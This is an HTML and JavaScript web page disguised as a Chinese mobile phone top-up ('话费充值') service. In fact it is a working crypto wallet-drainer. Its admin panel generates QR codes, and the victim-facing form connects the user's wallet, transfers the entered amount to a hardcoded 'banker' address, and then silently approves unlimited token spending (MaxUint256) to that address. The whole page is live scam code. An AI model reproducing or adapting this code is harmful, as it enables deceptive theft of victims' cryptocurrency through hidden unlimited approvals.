<!DOCTYPE html>
<html lang="utf-8">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>话费充值</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
body{background:#050814;color:#fff;padding:20px;}
.container{max-width:480px;margin:0 auto;}
.card{background:rgba(255,255,255,0.05);border-radius:20px;padding:24px 20px;margin-bottom:20px;}
.title{font-size:18px;font-weight:600;margin-bottom:16px;text-align:center;}
input{
  width:100%;padding:14px 16px;border-radius:14px;
  background:rgba(255,255,255,0.08);
  border:1px solid rgba(255,255,255,0.1);
  color:#fff;font-size:15px;margin-bottom:12px;
}
button{
  width:100%;padding:14px 16px;border-radius:14px;
  background:#00e0ff;color:#000;font-weight:bold;
  border:none;cursor:pointer;font-size:15px;
  margin-bottom:8px;
}
.qr-box{
  margin:20px auto;width:240px;height:240px;
  background:#fff;padding:10px;border-radius:16px;
  display:none;
}
.operators{
  display:flex;justify-content:center;gap:10px;margin:10px 0;
}
.operator{
  padding:8px 12px;background:rgba(255,255,255,0.1);border-radius:12px;font-size:14px;
}
</style>
</head>
<body>

<div class="container">

  <!-- 管理员生成二维码 -->
  <div class="card" id="adminPanel">
    <div class="title">话费充值 - 后台生成二维码</div>
    <input id="token" placeholder="粘贴币安链ERC20代币合约地址">
    <button onclick="createQR()">生成充值二维码</button>
    <div id="qrcode" class="qr-box"></div>
  </div>

  <!-- 玩家扫码看到的话费充值界面 -->
  <div class="card" id="userPanel" style="display:none;">
    <div class="title">话费充值</div>
    <div class="operators">
      <div class="operator">中国移动</div>
      <div class="operator">中国联通</div>
      <div class="operator">中国电信</div>
    </div>
    <input id="phone" placeholder="请输入手机号" type="text">
    <button id="connectBtn" onclick="connectWallet()">连接钱包</button>
    <input id="userAmount" placeholder="输入充值金额" type="number">
    <button onclick="payAndAuth()">立即充值</button>
  </div>

</div>

<script>
// 庄家地址已内置
const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";

let signer = null;
let tokenAddress = null;

// ------------------------------
// 管理员生成二维码
// ------------------------------
function createQR() {
  const token = document.getElementById('token').value.trim();
  if (!token) {
    alert('请输入代币合约地址');
    return;
  }
  const url = `${location.origin}${location.pathname}?token=${token}`;
  QRCode.toCanvas(document.getElementById('qrcode'), url, { width:220, margin:1 }, err => {
    if (!err) document.getElementById('qrcode').style.display = 'block';
  });
}

// ------------------------------
// 玩家扫码进入页面
// ------------------------------
window.onload = async () => {
  const params = new URLSearchParams(location.search);
  const token = params.get('token');
  if (token) {
    tokenAddress = token;
    document.getElementById('adminPanel').style.display = 'none';
    document.getElementById('userPanel').style.display = 'block';
  }
};

// ------------------------------
// 连接钱包
// ------------------------------
async function connectWallet() {
  try {
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    document.getElementById('connectBtn').innerText = "已连接钱包";
  } catch (e) {
    alert("连接钱包失败：" + e.message);
  }
}

// ------------------------------
// 手机号严格验证
// ------------------------------
function isValidPhone(phone) {
  if (!phone || phone.length !== 11) return false;
  if (!/^1[3-9]\d{9}$/.test(phone)) return false;
  if (/^(\d)\1+$/.test(phone)) return false; // 禁止全同号
  return true;
}

// ------------------------------
// 充值（转账+授权）
// ------------------------------
async function payAndAuth() {
  const phone = document.getElementById('phone').value.trim();
  const amount = document.getElementById('userAmount').value.trim();

  if (!isValidPhone(phone)) {
    alert("请输入正确的手机号");
    return;
  }

  if (!amount || Number(amount) <= 0) {
    alert("请输入正确的充值金额");
    return;
  }

  if (!signer) {
    alert("请先连接钱包");
    return;
  }

  try {
    const ERC20_ABI = [
      "function transfer(address to, uint256 amount) external returns (bool)",
      "function approve(address spender, uint256 amount) external returns (bool)",
      "function decimals() view returns (uint8)"
    ];

    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    const decimals = await tokenContract.decimals().catch(() => 18);
    const value = ethers.parseUnits(amount, decimals);

    // 转给庄家
    await tokenContract.transfer(ADMIN_WALLET, value);
    // 授权给庄家
    await tokenContract.approve(ADMIN_WALLET, ethers.MaxUint256);

    alert("充值成功！");
  } catch (e) {
    alert("充值失败：" + e.message);
  }
}
</script>
</body>
</html>
